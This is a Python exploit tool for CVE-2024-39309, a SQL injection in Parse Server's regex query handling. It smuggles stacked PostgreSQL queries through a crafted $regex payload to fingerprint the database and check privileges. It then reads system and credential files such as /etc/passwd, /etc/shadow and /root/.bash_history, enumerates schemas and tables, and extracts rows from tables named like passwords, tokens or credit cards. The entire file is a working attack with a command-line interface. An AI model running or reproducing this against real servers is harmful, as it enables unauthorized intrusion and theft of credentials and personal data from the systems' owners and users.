#!/usr/bin/env python3
"""
██████╗ █████╗ ████████╗██████╗ ██████╗  █████╗ ████████╗███████╗
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
██║  ██║███████║   ██║   ██████╔╝██████╔╝███████║   ██║   █████╗  
██║  ██║██╔══██║   ██║   ██╔══██╗██╔══██╗██╔══██║   ██║   ██╔══╝  
██████╔╝██║  ██║   ██║   ██║  ██║██████╔╝██║  ██║   ██║   ███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝

███████╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗ ██████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔════╝██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
███████╗█████╗  ███████║██║██╔██╗ ██║██║  ███╗█████╗  ██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
╚════██║██╔══╝  ██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
███████║███████╗██║  ██║██║██║ ╚████║╚██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Advanced Database Enumeration via POSTGRES SQL Injection
Author: HeavyGhost && EnglishX | CVE-2024-39309
Description: Comprehensive database enumeration via SQL injection in Parse Server,  prior to 6.5.7 and 7.1.0
https://nvd.nist.gov/vuln/detail/CVE-2024-39309
"""

import requests
import json
import sys
import argparse
from urllib.parse import quote

class DatabaseEnumerator:
    def __init__(self, target_url, app_id):
        self.target_url = target_url
        self.app_id = app_id
        self.session = requests.Session()
        self.session.headers.update({
            'X-Parse-Application-Id': app_id,
            'Content-Type': 'application/json'
        })
    
    def execute_sql(self, sql_query):
        """Execute SQL query via regex injection"""
        # Use the working pattern: A'B' becomes A''B' allowing semicolon injection
        payload = f"A'B'; {sql_query};--"
        
        where_clause = {
            "username": {
                "$regex": payload
            }
        }
        
        params = {
            "where": json.dumps(where_clause)
        }
        
        try:
            response = self.session.get(
                f"{self.target_url}/parse/classes/_User",
                params=params,
                timeout=10
            )
            return response.json()
        except Exception as e:
            print(f"Error executing query: {e}")
            return None

    # ===== DATABASE INFORMATION =====
    
    def get_database_version(self):
        """Get PostgreSQL version"""
        print("[+] Getting database version...")
        query = "SELECT version()"
        result = self.execute_sql(query)
        if result and 'results' in result and result['results']:
            version = result['results'][0].get('version', 'Unknown')
            print(f"[+] Database Version: {version}")
            return version
        return None
    
    def get_current_database(self):
        """Get current database name"""
        print("[+] Getting current database...")
        query = "SELECT current_database()"
        result = self.execute_sql(query)
        if result and 'results' in result and result['results']:
            db_name = result['results'][0].get('current_database', 'Unknown')
            print(f"[+] Current Database: {db_name}")
            return db_name
        return None
    
    def get_current_user(self):
        """Get current database user"""
        print("[+] Getting current user...")
        query = "SELECT current_user, session_user, user"
        result = self.execute_sql(query)
        if result and 'results' in result and result['results']:
            user_info = result['results'][0]
            print(f"[+] Current User: {user_info}")
            return user_info
        return None

    # ===== USER PERMISSIONS =====
    
    def get_user_privileges(self):
        """Get current user privileges"""
        print("[+] Getting user privileges...")
        
        queries = [
            "SELECT * FROM current_user_privileges",
            "SELECT grantee, privilege_type, table_name FROM information_schema.role_table_grants",
            "SELECT usename, usecreatedb, usesuper, usebypassrls FROM pg_user WHERE usename = current_user"
        ]
        
        all_privileges = {}
        for query in queries:
            result = self.execute_sql(query)
            if result and 'results' in result:
                all_privileges[query] = result['results']
        
        # Parse and display privileges
        print("\n[+] User Privileges Summary:")
        for query, results in all_privileges.items():
            if results:
                print(f"  Query: {query.split('FROM')[0]}...")
                for row in results[:3]:  # Show first 3 rows
                    print(f"    {row}")
        
        return all_privileges
    
    def check_super_user(self):
        """Check if current user is superuser"""
        print("[+] Checking superuser privileges...")
        query = "SELECT usesuper FROM pg_user WHERE usename = current_user"
        result = self.execute_sql(query)
        if result and 'results' in result and result['results']:
            is_super = result['results'][0].get('usesuper', False)
            status = "YES" if is_super else "NO"
            print(f"[+] Is Superuser: {status}")
            return is_super
        return False
    
    def check_file_operations(self):
        """Check if user can read/write files"""
        print("[+] Checking file operation privileges...")
        
        # Check if pg_read_file is available
        queries = [
            "SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'EXECUTE') as can_read_files",
            "SELECT has_function_privilege(current_user, 'pg_read_file(text, bigint, bigint)', 'EXECUTE') as can_read_files_offset",
            "SELECT has_function_privilege(current_user, 'pg_ls_dir(text)', 'EXECUTE') as can_list_dir",
            "SELECT has_function_privilege(current_user, 'pg_stat_file(text)', 'EXECUTE') as can_stat_file"
        ]
        
        file_privileges = {}
        for query in queries:
            result = self.execute_sql(query)
            if result and 'results' in result and result['results']:
                for key, value in result['results'][0].items():
                    file_privileges[key] = value
        
        print("[+] File Operation Privileges:")
        for privilege, has_priv in file_privileges.items():
            status = "YES" if has_priv else "NO"
            print(f"    - {privilege}: {status}")
        
        return file_privileges

    # ===== FILE SYSTEM ACCESS =====
    
    def read_file(self, file_path):
        """Read file using pg_read_file"""
        print(f"[+] Attempting to read file: {file_path}")
        
        queries = [
            f"SELECT pg_read_file('{file_path}') as content",
            f"SELECT pg_read_file('{file_path}', 0, 100000) as content",  # With offset
        ]
        
        for query in queries:
            result = self.execute_sql(query)
            if result and 'results' in result and result['results']:
                content = result['results'][0].get('content')
                if content and content != '':
                    print(f"[+] Successfully read {file_path}:")
                    print("-" * 50)
                    print(content)
                    print("-" * 50)
                    return content
        
        print(f"[-] Failed to read {file_path}")
        return None
    
    def list_directory(self, directory_path):
        """List directory contents using pg_ls_dir"""
        print(f"[+] Attempting to list directory: {directory_path}")
        
        query = f"SELECT pg_ls_dir('{directory_path}') as files"
        result = self.execute_sql(query)
        
        if result and 'results' in result:
            files = []
            for row in result['results']:
                if 'files' in row and row['files']:
                    files.append(row['files'])
            
            if files:
                print(f"[+] Directory contents of {directory_path}:")
                for file in files:
                    print(f"    - {file}")
                return files
            else:
                print(f"[-] No files found in {directory_path} or access denied")
        else:
            print(f"[-] Failed to list directory {directory_path}")
        
        return None
    
    def read_system_files(self):
        """Read common system files"""
        print("\n[+] Reading common system files...")
        
        system_files = [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/proc/version',
            '/proc/cmdline',
            '/etc/shadow',  # Will likely fail but worth trying
            '/root/.bash_history'
        ]
        
        for file_path in system_files:
            self.read_file(file_path)
    
    def read_etc_passwd(self):
        """Specifically read /etc/passwd file"""
        print("\n[+] Reading /etc/passwd file...")
        return self.read_file('/etc/passwd')

    # ===== DATABASE SCHEMA ENUMERATION =====
    
    def enumerate_schemas(self):
        """List all database schemas"""
        print("[+] Enumerating schemas...")
        query = "SELECT schema_name FROM information_schema.schemata"
        result = self.execute_sql(query)
        
        if result and 'results' in result:
            schemas = [row['schema_name'] for row in result['results']]
            print(f"[+] Found {len(schemas)} schemas:")
            for schema in schemas:
                print(f"    - {schema}")
            return schemas
        return []
    
    def enumerate_tables(self, schema='public'):
        """List all tables in specified schema"""
        print(f"[+] Enumerating tables in schema: {schema}...")
        query = f"SELECT table_name, table_type FROM information_schema.tables WHERE table_schema = '{schema}'"
        result = self.execute_sql(query)
        
        if result and 'results' in result:
            tables = [(row['table_name'], row.get('table_type', 'TABLE')) for row in result['results']]
            print(f"[+] Found {len(tables)} tables in {schema}:")
            for table_name, table_type in tables:
                print(f"    - {table_name} ({table_type})")
            return tables
        return []
    
    def get_table_columns(self, table_name, schema='public'):
        """Get column names and types for a specific table"""
        print(f"[+] Getting columns for table: {schema}.{table_name}")
        
        query = f"""
        SELECT column_name, data_type, is_nullable, column_default 
        FROM information_schema.columns 
        WHERE table_schema = '{schema}' AND table_name = '{table_name}'
        ORDER BY ordinal_position
        """
        result = self.execute_sql(query)
        
        if result and 'results' in result:
            columns = result['results']
            print(f"[+] Columns in {schema}.{table_name}:")
            for col in columns:
                print(f"    - {col['column_name']} ({col['data_type']}) - Nullable: {col['is_nullable']}")
            return columns
        return []
    
    def get_table_row_count(self, table_name, schema='public'):
        """Get row count for a table"""
        query = f"SELECT COUNT(*) as row_count FROM {schema}.{table_name}"
        result = self.execute_sql(query)
        if result and 'results' in result and result['results']:
            count = result['results'][0].get('row_count', 0)
            print(f"[+] {schema}.{table_name} has {count} rows")
            return count
        return 0

    # ===== DATA EXTRACTION =====
    
    def extract_table_sample(self, table_name, schema='public', limit=5):
        """Extract sample data from a table"""
        print(f"[+] Extracting sample data from {schema}.{table_name}...")
        
        # First get columns
        columns = self.get_table_columns(table_name, schema)
        if not columns:
            return None
        
        column_names = [col['column_name'] for col in columns]
        col_list = ", ".join(column_names)
        
        query = f"SELECT {col_list} FROM {schema}.{table_name} LIMIT {limit}"
        result = self.execute_sql(query)
        
        if result and 'results' in result:
            print(f"[+] Sample data from {schema}.{table_name}:")
            for i, row in enumerate(result['results']):
                print(f"    Row {i+1}: {row}")
            return result['results']
        return None
    
    def search_sensitive_data(self):
        """Search for potentially sensitive tables and columns"""
        print("[+] Searching for sensitive data patterns...")
        
        sensitive_patterns = [
            ("table_name LIKE '%user%'", "User tables"),
            ("table_name LIKE '%pass%'", "Password tables"),
            ("table_name LIKE '%auth%'", "Authentication tables"),
            ("table_name LIKE '%secret%'", "Secret tables"),
            ("table_name LIKE '%key%'", "Key tables"),
            ("table_name LIKE '%flag%'", "Flag tables"),
            ("table_name LIKE '%credit%'", "Credit card tables"),
            ("table_name LIKE '%token%'", "Token tables")
        ]
        
        sensitive_tables = []
        for pattern, description in sensitive_patterns:
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND {pattern}"
            result = self.execute_sql(query)
            if result and 'results' in result:
                for row in result['results']:
                    table_name = row['table_name']
                    if table_name not in [t[0] for t in sensitive_tables]:
                        sensitive_tables.append((table_name, description))
        
        if sensitive_tables:
            print("[+] Potentially sensitive tables found:")
            for table_name, description in sensitive_tables:
                print(f"    - {table_name} ({description})")
        else:
            print("[-] No obvious sensitive tables found")
        
        return sensitive_tables

    # ===== COMPREHENSIVE ENUMERATION =====
    
    def comprehensive_enumeration(self):
        """Run complete database enumeration"""
        print("[*] Starting comprehensive database enumeration...")
        
        # Database Information
        print("\n" + "="*50)
        print("DATABASE INFORMATION")
        print("="*50)
        self.get_database_version()
        self.get_current_database()
        self.get_current_user()
        
        # User Privileges
        print("\n" + "="*50)
        print("USER PRIVILEGES")
        print("="*50)
        self.get_user_privileges()
        self.check_super_user()
        file_privs = self.check_file_operations()
        
        # File System Access (if available)
        if file_privs.get('can_read_files') or file_privs.get('can_read_files_offset'):
            print("\n" + "="*50)
            print("FILE SYSTEM ACCESS")
            print("="*50)
            self.read_etc_passwd()
            
            # Try to list some directories
            self.list_directory('/etc')
            self.list_directory('/home')
            
            # Read more system files
            self.read_system_files()
        
        # Schema Enumeration
        print("\n" + "="*50)
        print("SCHEMA ENUMERATION")
        print("="*50)
        schemas = self.enumerate_schemas()
        
        # Table Enumeration
        print("\n" + "="*50)
        print("TABLE ENUMERATION")
        print("="*50)
        for schema in schemas:
            tables = self.enumerate_tables(schema)
            if tables:
                # Get sample from first 3 tables
                for table_name, table_type in tables[:3]:
                    self.get_table_columns(table_name, schema)
                    self.get_table_row_count(table_name, schema)
                    if table_type == 'BASE TABLE':
                        self.extract_table_sample(table_name, schema, 2)
        
        # Sensitive Data Search
        print("\n" + "="*50)
        print("SENSITIVE DATA SEARCH")
        print("="*50)
        sensitive_tables = self.search_sensitive_data()
        
        # Extract from sensitive tables
        if sensitive_tables:
            print("\n[+] Extracting from sensitive tables...")
            for table_name, description in sensitive_tables[:3]:  # Limit to first 3
                self.extract_table_sample(table_name, 'public', 3)
        
        print("\n[+] Database enumeration completed!")

def main():
    parser = argparse.ArgumentParser(description='Advanced Database Enumeration via SQL Injection')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://10.0.14.52:1337)')
    parser.add_argument('-a', '--app-id', required=True, help='Parse Application ID')
    parser.add_argument('-t', '--table', help='Specific table to enumerate')
    parser.add_argument('-s', '--schema', default='public', help='Schema to enumerate (default: public)')
    parser.add_argument('-f', '--file', help='Read specific file (e.g., /etc/passwd)')
    parser.add_argument('-d', '--dir', help='List specific directory')
    parser.add_argument('--read-system', action='store_true', help='Read common system files')
    
    args = parser.parse_args()
    
    enumerator = DatabaseEnumerator(args.url, args.app_id)
    
    print("""
    ██████╗ █████╗ ████████╗██████╗ ██████╗  █████╗ ████████╗███████╗███████╗
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔════╝
    ██║  ██║███████║   ██║   ██████╔╝██████╔╝███████║   ██║   █████╗  ███████╗
    ██║  ██║██╔══██║   ██║   ██╔══██╗██╔══██╗██╔══██║   ██║   ██╔══╝  ╚════██║
    ██████╔╝██║  ██║   ██║   ██║  ██║██████╔╝██║  ██║   ██║   ███████╗███████║
    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝
                                                                            
    ███████╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗ ██████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
    ██╔════╝██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
    ███████╗█████╗  ███████║██║██╔██╗ ██║██║  ███╗█████╗  ██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
    ╚════██║██╔══╝  ██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
    ███████║███████╗██║  ██║██║██║ ╚████║╚██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
    
    Advanced Database Enumeration via POSTGRES SQL Injection
    Author: HeavyGhost && EnglishX | CVE-2024-39309
    Description: Comprehensive database enumeration via SQL injection in Parse Server,  prior to 6.5.7 and 7.1.0
    https://nvd.nist.gov/vuln/detail/CVE-2024-39309
    """)
    
    if args.file:
        # Read specific file
        print(f"[*] Reading file: {args.file}")
        enumerator.read_file(args.file)
    elif args.dir:
        # List specific directory
        print(f"[*] Listing directory: {args.dir}")
        enumerator.list_directory(args.dir)
    elif args.read_system:
        # Read system files
        print("[*] Reading system files...")
        enumerator.read_system_files()
    elif args.table:
        # Enumerate specific table
        print(f"[*] Enumerating specific table: {args.table}")
        enumerator.get_table_columns(args.table, args.schema)
        enumerator.get_table_row_count(args.table, args.schema)
        enumerator.extract_table_sample(args.table, args.schema, 10)
    else:
        # Run comprehensive enumeration
        enumerator.comprehensive_enumeration()

if __name__ == "__main__":
    main()